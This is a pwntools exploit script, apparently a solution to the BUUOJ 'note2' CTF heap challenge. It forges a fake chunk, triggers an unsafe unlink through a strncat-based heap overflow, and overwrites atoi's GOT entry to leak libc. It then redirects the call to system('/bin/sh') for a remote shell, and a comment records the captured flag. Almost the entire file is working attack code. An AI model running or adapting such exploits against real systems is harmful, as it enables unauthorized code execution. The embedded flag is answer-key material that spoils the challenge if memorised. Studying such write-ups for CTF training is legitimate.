#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 26391
elfpath = './note2_patched'
ldpath = './ld-2.23.so'
libcpath = './libc6_2.23-0ubuntu10_amd64.so'

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success("{}: {}".format(func, hex(address)))


def command(c):
    ru(b'option--->>\n')
    sl(str(c).encode())

# size cannot be greater than 0x80


def add(size, content):
    command(1)
    ru(b'Input the length of the note content:(less than 128)\n')
    sl(str(size).encode())
    ru(b'Input the note content:\n')
    sl(content)


def edit(index, content, option):
    '''
    1. overwrite
    2. append
    '''
    command(3)
    ru(b'Input the id of the note:\n')
    sl(str(index).encode())
    ru(b'do you want to overwrite or append?[1.overwrite/2.append]\n')
    sl(str(option).encode())
    ru(b'TheNewContents:')
    sl(content)


def free(index):
    command(4)
    ru(b'Input the id of the note:\n')
    sl(str(index).encode())


def show(index):
    command(2)
    ru(b'Input the id of the note:\n')
    sl(str(index).encode())
    ru(b'Content is ')
    # return ru(b'\n', drop = True)


ru(b'Input your name:\n')
sl(b"test")
ru(b'address:\n')
sl(b"test")

# start pwning
'''
存在堆溢出
free之后会将指针置0
最多add 4次
'''
ptr = 0x602120

fake_chunk = b'\x00'*8 + p64(0xa1)
# 伪造指针，触发unlink
fake_chunk += p64(ptr-0x18) + p64(ptr - 0x10)
fake_chunk = fake_chunk.ljust(0x80, b'\x00')
add(0x80, fake_chunk)  # id 0
add(0x0, b'')  # id 1, 满足堆溢出的触发条件
add(0x80, b'a')  # id 2
add(0x10, b'/bin/sh')  # id 3
# 题目中用的是strncat，所以这里的填充内容需要修改
edit(1, b'a'*0x18 + p64(0x90), 1)
for i in range(6):
    edit(1, b'a'*(0x10 + 7-i), 1)
edit(1, b'a'*0x10 + b'\xa0', 1)

# gdb.attach(p)
free(2)  # unlink

e = ELF(elfpath)
libc = ELF(libcpath)

# edit(0, b'a'*0x18 + p64(e.got['puts']) + p64(e.got['free']), 1) # 这里后面的的p64()存在\x00，会有截断
edit(0, b'a'*0x18 + p64(e.got['atoi']), 1)
if args.LOCAL:
    gdb.attach(p)
show(0)
puts_addr = u64(ru7f()[-6:] + b'\x00'*2)
libc_base = puts_addr - libc.sym['atoi']
leak("libcbase", libc_base)
system = libc_base + libc.sym['system']
edit(0, p64(system), 1)
ru(b'>>\n')
sl(b'/bin/sh')
# flag{67fa4617-6e61-4019-adce-f9b64afe851f}
shell()
